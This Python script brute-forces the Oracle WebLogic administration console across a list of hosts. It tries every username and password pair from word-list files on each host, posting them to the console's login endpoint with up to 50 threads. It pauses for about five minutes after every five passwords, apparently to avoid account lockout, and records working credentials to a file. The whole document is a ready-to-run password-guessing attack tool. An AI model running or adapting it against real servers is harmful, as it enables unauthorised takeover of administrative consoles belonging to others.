import requests
import time
import threading
import traceback
import sys

RETRY=3
MAX_THREAD=50

class Brute:
	def __init__(self):
		self.success=0
		self.fail=0
		self.error=0
		self.sec=0
		self.success_list=[]
		self.error_list=[]
		self.doing_list=[]
	def _do_login(self,url,usr,pwd):
		data = {'j_username': usr, 'j_password': pwd}
		count=0
		while url in self.doing_list:	#To increase accuracy,add a doing lock
			time.sleep(1)	#If other thread is trying,we wait for it
		if url not in self.success_list:
			self.doing_list.append(url) #It's time for us to do it while no other thread is doing the same thing.
		else:
			return	#If other thread get it before this thread,we exit.
		while count < RETRY:
			try:
				s = requests.post('http://%s/console/j_security_check'%url, data=data, timeout=10)
				if s.content.count('Home Page') != 0 or s.content.count('WebLogic Server Console') != 0 or s.content.count('console.portal') != 0:
					sys.stdout.write('Success!!!!! %s %s/%s                                                                                    \n' % (url, usr, pwd))
					sys.stdout.flush()
					self.success += 1
					self.success_list.append(url)
					f = open('success.txt', 'a')
					f.write('%s %s/%s\n' % (url, usr, pwd))
					f.close()
					del self.doing_list[self.doing_list.index(url)]
					return True
				else:
					del self.doing_list[self.doing_list.index(url)]
					self.fail+=1
					return False
			except:
				# traceback.print_exc()
				count+=1
				time.sleep(1)
		del self.doing_list[self.doing_list.index(url)] #Error
		self.error+=1
		self.error_list.append(url)
		f=open('error.txt','a')
		f.write('%s\n'%url)
		f.close()

	def _main(self):
		for usr in open('usr.txt').readlines():
			count=0
			usr=usr.strip()
			for pwd in open('pwd.txt').readlines():
				pos=0
				self.fail = 0
				count+=1
				pwd=pwd.strip()
				if count == 6:
					self.sec=310
					while self.sec != 0:
						time.sleep(1)
						sys.stdout.write('Waiting,%d                                           \r'%self.sec)
						sys.stdout.flush()
						self.sec-=1
					count=1
				with open(sys.argv[1]) as f:
					for url in f:
						pos+=1
						url = url.strip()
						if url not in self.success_list:
							if url not in self.error_list:
								t = threading.Thread(target=self._do_login, args=(url,usr,pwd))
								t.daemon=True
								while True:
									if threading.active_count() < MAX_THREAD:
										t.start()
										sys.stdout.write( "Current threads: %d,Position:%d,Success:%d,Fail:%d,Error:%d\r" % (threading.active_count(),pos,self.success,self.fail,self.error),)
										sys.stdout.flush()
										time.sleep(0.001)
										break
									else:
										time.sleep(1)
						#do nothing with success or error ip
if __name__ == '__main__':
	run=Brute()
	try:
		run._main()
	except KeyboardInterrupt:
		exit()
